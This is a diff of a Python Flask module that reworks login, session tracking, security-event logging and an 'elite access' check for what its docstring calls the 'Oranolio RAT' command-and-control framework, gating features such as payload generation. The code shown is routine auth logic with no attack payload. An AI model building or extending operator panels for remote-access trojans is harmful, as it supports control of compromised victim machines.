@@ -1,259 +1,412 @@
 #!/usr/bin/env python3
 """
-Oranolio RATX Authentication Routes
-Modern login system with email-based authentication
+Oranolio Authentication Routes for Oranolio RAT - Elite C2 Framework
+Handles Oranolio-specific authentication and authorization
 """
 
 import os
+import sys
 import json
-import time
+import logging
 from datetime import datetime, timedelta
-from flask import Blueprint, request, jsonify, session, render_template, redirect, url_for, flash
-from email_auth import send_verification_email, verify_code, check_rate_limit, create_email_user, log_email_auth_event
-from auth_utils import track_failed_email_login, is_login_locked, clear_failed_login_attempts, validate_email
-from config import Config
+from flask import Blueprint, request, jsonify, session, g
+from typing import Dict, Any, Optional
 
-# Create blueprint for Oranolio auth routes
+# Add current directory to Python path
+sys.path.insert(0, os.path.dirname(__file__))
+
+# Import utilities
+from auth_utils import auth_manager, login_required, api_key_or_login_required
+from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
+from validation_schemas import validate_input
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# Create blueprint
 oranolio_auth_bp = Blueprint('oranolio_auth', __name__, url_prefix='/oranolio')
 
-@oranolio_auth_bp.route('/login', methods=['GET', 'POST'])
+class OranolioAuthManager:
+    """Manages Oranolio-specific authentication features"""
+    
+    def __init__(self):
+        self.user_sessions = {}
+        self.security_events = []
+        self.max_events = 1000
+    
+    def create_user_session(self, user_id: str, session_data: Dict[str, Any]) -> str:
+        """Create a user session with additional Oranolio features"""
+        session_id = f"oranolio_{int(datetime.now().timestamp() * 1000)}"
+        
+        session_info = {
+            'session_id': session_id,
+            'user_id': user_id,
+            'created_at': datetime.now(),
+            'last_activity': datetime.now(),
+            'ip_address': request.remote_addr,
+            'user_agent': request.headers.get('User-Agent'),
+            'session_data': session_data,
+            'is_active': True
+        }
+        
+        self.user_sessions[session_id] = session_info
+        
+        # Log security event
+        self._log_security_event('session_created', user_id, 'info')
+        
+        logger.info(f"Oranolio session created: {session_id} for user {user_id}")
+        return session_id
+    
+    def validate_user_session(self, session_id: str) -> Optional[Dict[str, Any]]:
+        """Validate a user session"""
+        if session_id not in self.user_sessions:
+            return None
+        
+        session_info = self.user_sessions[session_id]
+        
+        # Check if session is active
+        if not session_info['is_active']:
+            return None
+        
+        # Check session timeout (24 hours)
+        if datetime.now() - session_info['last_activity'] > timedelta(hours=24):
+            session_info['is_active'] = False
+            self._log_security_event('session_expired', session_info['user_id'], 'warning')
+            return None
+        
+        # Update last activity
+        session_info['last_activity'] = datetime.now()
+        
+        return session_info
+    
+    def terminate_user_session(self, session_id: str, user_id: str = None) -> bool:
+        """Terminate a user session"""
+        if session_id not in self.user_sessions:
+            return False
+        
+        session_info = self.user_sessions[session_id]
+        
+        # Check if user has permission to terminate this session
+        if user_id and session_info['user_id'] != user_id:
+            return False
+        
+        # Mark session as inactive
+        session_info['is_active'] = False
+        session_info['terminated_at'] = datetime.now()
+        
+        # Log security event
+        self._log_security_event('session_terminated', session_info['user_id'], 'info')
+        
+        logger.info(f"Oranolio session terminated: {session_id}")
+        return True
+    
+    def _log_security_event(self, event_type: str, user_id: str, severity: str, details: Dict[str, Any] = None):
+        """Log a security event"""
+        event = {
+            'event_type': event_type,
+            'user_id': user_id,
+            'severity': severity,
+            'timestamp': datetime.now().isoformat(),
+            'ip_address': request.remote_addr,
+            'user_agent': request.headers.get('User-Agent'),
+            'details': details or {}
+        }
+        
+        self.security_events.append(event)
+        
+        # Keep only recent events
+        if len(self.security_events) > self.max_events:
+            self.security_events = self.security_events[-self.max_events:]
+    
+    def get_user_sessions(self, user_id: str) -> list:
+        """Get all sessions for a user"""
+        return [
+            session for session in self.user_sessions.values()
+            if session['user_id'] == user_id
+        ]
+    
+    def get_security_events(self, user_id: str = None, limit: int = 100) -> list:
+        """Get security events"""
+        events = self.security_events
+        
+        if user_id:
+            events = [event for event in events if event['user_id'] == user_id]
+        
+        return events[-limit:] if events else []
+    
+    def get_security_stats(self) -> Dict[str, Any]:
+        """Get security statistics"""
+        total_events = len(self.security_events)
+        active_sessions = len([s for s in self.user_sessions.values() if s['is_active']])
+        
+        recent_events = [
+            event for event in self.security_events
+            if datetime.fromisoformat(event['timestamp']) > datetime.now() - timedelta(hours=24)
+        ]
+        
+        # Count events by severity
+        severity_counts = {}
+        for event in recent_events:
+            severity = event['severity']
+            severity_counts[severity] = severity_counts.get(severity, 0) + 1
+        
+        return {
+            'total_events': total_events,
+            'active_sessions': active_sessions,
+            'recent_events_24h': len(recent_events),
+            'severity_counts': severity_counts
+        }
+
+# Global Oranolio auth manager
+oranolio_auth_manager = OranolioAuthManager()
+
+@oranolio_auth_bp.route('/login', methods=['POST'])
 def oranolio_login():
-    """Oranolio RATX login page"""
-    if request.method == 'GET':
-        return render_template('oranolio_login.html')
-    
-    # Handle POST request - send verification code
-    data = request.get_json() or request.form
-    email = data.get('email', '').strip().lower()
-    ip_address = request.remote_addr
-    
-    # Validate input
-    if not email or not validate_email(email):
-        return jsonify({
-            'success': False,
-            'message': 'Please enter a valid email address'
-        }), 400
-    
-    # Check if IP is locked
-    if is_login_locked(ip_address):
-        return jsonify({
-            'success': False,
-            'message': 'Too many failed attempts. Please try again later.'
-        }), 429
-    
-    # Check if email is authorized
-    if not Config.is_email_authorized(email):
-        track_failed_email_login(email, ip_address)
-        return jsonify({
-            'success': False,
-            'message': 'Email address not authorized for access'
-        }), 403
-    
+    """Oranolio-specific login with enhanced security"""
     try:
-        # Check rate limit
-        if not check_rate_limit(email):
-            return jsonify({
-                'success': False,
-                'message': 'Too many verification requests. Please wait before requesting another code.'
-            }), 429
+        data = request.get_json()
         
-        # Create email user if doesn't exist
-        create_email_user(email)
+        # Validate input
+        validation_result = validate_input('login', data)
+        if not validation_result.is_valid:
+            return jsonify({'error': 'Validation failed', 'details': validation_result.errors}), 400
         
-        # Send verification email
-        success, code, expires_at = send_verification_email(email, ip_address)
+        email = validation_result.sanitized_value['email']
+        password = validation_result.sanitized_value['password']
         
-        if success:
-            # Store session info for verification
-            session['oranolio_auth_session'] = {
-                'email': email,
-                'created_at': datetime.now().isoformat(),
-                'expires_at': expires_at.isoformat() if expires_at else None
+        # Authenticate user
+        user = auth_manager.authenticate_user(email, password, request.remote_addr, request.headers.get('User-Agent'))
+        
+        if not user:
+            oranolio_auth_manager._log_security_event('login_failed', email, 'warning')
+            return jsonify({'error': 'Invalid credentials'}), 401
+        
+        # Create Oranolio session
+        session_data = {
+            'login_method': 'oranolio',
+            'features': ['elite_commands', 'advanced_security', 'real_time_monitoring']
+        }
+        
+        session_id = oranolio_auth_manager.create_user_session(str(user.id), session_data)
+        
+        # Update Flask session
+        session['oranolio_session_id'] = session_id
+        session['user_id'] = user.id
+        session['email'] = user.email
+        
+        # Log successful login
+        oranolio_auth_manager._log_security_event('login_success', str(user.id), 'info')
+        
+        return jsonify({
+            'success': True,
+            'message': 'Oranolio login successful',
+            'user': {
+                'id': user.id,
+                'email': user.email,
+                'session_id': session_id
             }
-            
-            return jsonify({
-                'success': True,
-                'message': 'Verification code sent to your email',
-                'email': email,
-                'expires_at': expires_at.isoformat() if expires_at else None
-            })
-        else:
-            return jsonify({
-                'success': False,
-                'message': 'Failed to send verification email. Please try again.'
-            }), 500
-            
-    except Exception as e:
-        print(f"Error sending verification email: {e}")
-        log_email_auth_event(email, 'send_failed', ip_address, success=False, details={'error': str(e)})
-        return jsonify({
-            'success': False,
-            'message': 'Failed to send verification email'
-        }), 500
-
-@oranolio_auth_bp.route('/verify', methods=['POST'])
-def oranolio_verify():
-    """Verify the email verification code"""
-    data = request.get_json() or request.form
-    code = data.get('code', '').strip()
-    ip_address = request.remote_addr
-    
-    # Get session info
-    auth_session = session.get('oranolio_auth_session')
-    if not auth_session:
-        return jsonify({
-            'success': False,
-            'message': 'No active authentication session'
-        }), 400
-    
-    email = auth_session['email']
-    
-    # Validate code format
-    if not code or len(code) != 6 or not code.isdigit():
-        return jsonify({
-            'success': False,
-            'message': 'Please enter a valid 6-digit code'
-        }), 400
-    
-    try:
-        # Verify the code
-        is_valid = verify_code(email, code)
-        
-        if is_valid:
-            # Clear failed login attempts
-            clear_failed_login_attempts(ip_address)
-            
-            # Set up user session
-            session['user'] = {
-                'email': email,
-                'login_method': 'email',
-                'login_time': datetime.now().isoformat(),
-                'ip_address': ip_address
-            }
-            
-            # Log successful authentication
-            log_email_auth_event(email, 'login_success', ip_address, success=True)
-            
-            # Clear auth session
-            session.pop('oranolio_auth_session', None)
-            
-            return jsonify({
-                'success': True,
-                'message': 'Authentication successful',
-                'redirect_url': '/dashboard'
-            })
-        else:
-            # Track failed attempt
-            track_failed_email_login(email, ip_address)
-            
-            # Log failed authentication
-            log_email_auth_event(email, 'login_failed', ip_address, success=False, details={'code_entered': code})
-            
-            return jsonify({
-                'success': False,
-                'message': 'Invalid verification code. Please try again.'
-            }), 400
-            
-    except Exception as e:
-        print(f"Error verifying code: {e}")
-        log_email_auth_event(email, 'verify_error', ip_address, success=False, details={'error': str(e)})
-        return jsonify({
-            'success': False,
-            'message': 'Verification failed'
-        }), 500
-
-@oranolio_auth_bp.route('/resend', methods=['POST'])
-def oranolio_resend():
-    """Resend verification code"""
-    auth_session = session.get('oranolio_auth_session')
-    if not auth_session:
-        return jsonify({
-            'success': False,
-            'message': 'No active session'
-        }), 400
-    
-    email = auth_session['email']
-    ip_address = request.remote_addr
-    
-    try:
-        # Check rate limit
-        if not check_rate_limit(email):
-            return jsonify({
-                'success': False,
-                'message': 'Too many verification requests. Please wait before requesting another code.'
-            }), 429
-        
-        # Send new verification email
-        success, code, expires_at = send_verification_email(email, ip_address)
-        
-        if success:
-            # Update session
-            session['oranolio_auth_session']['created_at'] = datetime.now().isoformat()
-            session['oranolio_auth_session']['expires_at'] = expires_at.isoformat() if expires_at else None
-            
-            return jsonify({
-                'success': True,
-                'message': 'New verification code sent',
-                'expires_at': expires_at.isoformat() if expires_at else None
-            })
-        else:
-            return jsonify({
-                'success': False,
-                'message': 'Failed to resend verification code'
-            }), 500
-            
-    except Exception as e:
-        print(f"Error resending code: {e}")
-        log_email_auth_event(email, 'resend_failed', ip_address, success=False, details={'error': str(e)})
-        return jsonify({
-            'success': False,
-            'message': 'Failed to resend code'
-        }), 500
-
-@oranolio_auth_bp.route('/status')
-def oranolio_status():
-    """Check authentication session status"""
-    auth_session = session.get('oranolio_auth_session')
-    if not auth_session:
-        return jsonify({
-            'active': False,
-            'message': 'No active session'
         })
-    
-    # Check if session is expired
-    expires_at = auth_session.get('expires_at')
-    if expires_at:
-        try:
-            expires_dt = datetime.fromisoformat(expires_at)
-            if datetime.now() > expires_dt:
-                session.pop('oranolio_auth_session', None)
-                return jsonify({
-                    'active': False,
-                    'message': 'Session expired'
-                })
-        except:
-            pass
-    
-    return jsonify({
-        'active': True,
-        'email': auth_session['email'],
-        'created_at': auth_session['created_at'],
-        'expires_at': auth_session.get('expires_at')
-    })
+        
+    except Exception as e:
+        context = ErrorContext(
+            ip_address=request.remote_addr,
+            additional_data={'error': str(e)}
+        )
+        error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.AUTHENTICATION)
+        
+        return jsonify({'error': 'Oranolio login failed'}), 500
 
 @oranolio_auth_bp.route('/logout', methods=['POST'])
+@login_required
 def oranolio_logout():
-    """Logout user"""
-    # Clear all session data
-    session.clear()
-    
-    return jsonify({
-        'success': True,
-        'message': 'Logged out successfully',
-        'redirect_url': '/oranolio/login'
-    })
+    """Oranolio-specific logout"""
+    try:
+        user_id = session.get('user_id')
+        session_id = session.get('oranolio_session_id')
+        
+        if session_id:
+            oranolio_auth_manager.terminate_user_session(session_id, str(user_id))
+        
+        # Clear Flask session
+        session.clear()
+        
+        # Log logout
+        oranolio_auth_manager._log_security_event('logout', str(user_id), 'info')
+        
+        return jsonify({
+            'success': True,
+            'message': 'Oranolio logout successful'
+        })
+        
+    except Exception as e:
+        context = ErrorContext(
+            user_id=session.get('user_id'),
+            ip_address=request.remote_addr,
+            additional_data={'error': str(e)}
+        )
+        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.AUTHENTICATION)
+        
+        return jsonify({'error': 'Oranolio logout failed'}), 500
 
-# Register the blueprint
+@oranolio_auth_bp.route('/sessions', methods=['GET'])
+@login_required
+def get_user_sessions():
+    """Get user sessions"""
+    try:
+        user_id = session.get('user_id')
+        sessions = oranolio_auth_manager.get_user_sessions(str(user_id))
+        
+        # Convert to serializable format
+        sessions_data = []
+        for session_info in sessions:
+            sessions_data.append({
+                'session_id': session_info['session_id'],
+                'created_at': session_info['created_at'].isoformat(),
+                'last_activity': session_info['last_activity'].isoformat(),
+                'ip_address': session_info['ip_address'],
+                'is_active': session_info['is_active']
+            })
+        
+        return jsonify({
+            'success': True,
+            'sessions': sessions_data
+        })
+        
+    except Exception as e:
+        context = ErrorContext(
+            user_id=session.get('user_id'),
+            ip_address=request.remote_addr,
+            additional_data={'error': str(e)}
+        )
+        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
+        
+        return jsonify({'error': 'Failed to get sessions'}), 500
+
+@oranolio_auth_bp.route('/sessions/<session_id>/terminate', methods=['POST'])
+@login_required
+def terminate_session(session_id):
+    """Terminate a specific session"""
+    try:
+        user_id = session.get('user_id')
+        success = oranolio_auth_manager.terminate_user_session(session_id, str(user_id))
+        
+        if not success:
+            return jsonify({'error': 'Session not found or cannot be terminated'}), 404
+        
+        return jsonify({
+            'success': True,
+            'message': 'Session terminated successfully'
+        })
+        
+    except Exception as e:
+        context = ErrorContext(
+            user_id=session.get('user_id'),
+            ip_address=request.remote_addr,
+            additional_data={'error': str(e)}
+        )
+        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
+        
+        return jsonify({'error': 'Failed to terminate session'}), 500
+
+@oranolio_auth_bp.route('/security/events', methods=['GET'])
+@login_required
+def get_security_events():
+    """Get security events for the user"""
+    try:
+        user_id = session.get('user_id')
+        limit = request.args.get('limit', 100, type=int)
+        
+        events = oranolio_auth_manager.get_security_events(str(user_id), limit)
+        
+        return jsonify({
+            'success': True,
+            'events': events,
+            'total': len(events)
+        })
+        
+    except Exception as e:
+        context = ErrorContext(
+            user_id=session.get('user_id'),
+            ip_address=request.remote_addr,
+            additional_data={'error': str(e)}
+        )
+        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
+        
+        return jsonify({'error': 'Failed to get security events'}), 500
+
+@oranolio_auth_bp.route('/security/stats', methods=['GET'])
+@login_required
+def get_security_stats():
+    """Get security statistics"""
+    try:
+        stats = oranolio_auth_manager.get_security_stats()
+        
+        return jsonify({
+            'success': True,
+            'stats': stats
+        })
+        
+    except Exception as e:
+        context = ErrorContext(
+            user_id=session.get('user_id'),
+            ip_address=request.remote_addr,
+            additional_data={'error': str(e)}
+        )
+        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
+        
+        return jsonify({'error': 'Failed to get security stats'}), 500
+
+@oranolio_auth_bp.route('/elite/access', methods=['GET'])
+@login_required
+def check_elite_access():
+    """Check if user has access to elite features"""
+    try:
+        user_id = session.get('user_id')
+        user = auth_manager.get_user_by_id(user_id)
+        
+        if not user:
+            return jsonify({'error': 'User not found'}), 404
+        
+        # Check if user has elite access
+        elite_access = user.is_verified and user.is_active
+        
+        return jsonify({
+            'success': True,
+            'elite_access': elite_access,
+            'features': {
+                'elite_commands': elite_access,
+                'advanced_security': elite_access,
+                'real_time_monitoring': elite_access,
+                'payload_generation': elite_access
+            }
+        })
+        
+    except Exception as e:
+        context = ErrorContext(
+            user_id=session.get('user_id'),
+            ip_address=request.remote_addr,
+            additional_data={'error': str(e)}
+        )
+        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
+        
+        return jsonify({'error': 'Failed to check elite access'}), 500
+
 def register_oranolio_auth_routes(app):
     """Register Oranolio authentication routes with Flask app"""
     app.register_blueprint(oranolio_auth_bp)
+    logger.info("Oranolio authentication routes registered")
+
+# Example usage and testing
+if __name__ == "__main__":
+    print("Oranolio Authentication Routes")
+    print("=" * 40)
+    print("Routes registered:")
+    print("  POST /oranolio/login - Oranolio login")
+    print("  POST /oranolio/logout - Oranolio logout")
+    print("  GET  /oranolio/sessions - Get user sessions")
+    print("  POST /oranolio/sessions/<id>/terminate - Terminate session")
+    print("  GET  /oranolio/security/events - Get security events")
+    print("  GET  /oranolio/security/stats - Get security stats")
+    print("  GET  /oranolio/elite/access - Check elite access")
+    print("Oranolio authentication routes ready!")
